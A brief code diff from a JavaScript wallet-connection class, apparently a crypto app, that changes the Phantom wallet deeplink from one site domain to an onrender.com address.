@@ -240,7 +240,7 @@ class NexiumApp {
 
       // Deeplink
       const deeplinks = {
-        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexiumboost.com?ref=https%3A%2F%2Fnexiumboost.com'
+        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Ftoken-site.onrender.com?ref=https%3A%2F%2Ftoken-site.onrender.com'
       };
       const deeplink = deeplinks[walletName];
       if (!deeplink) {
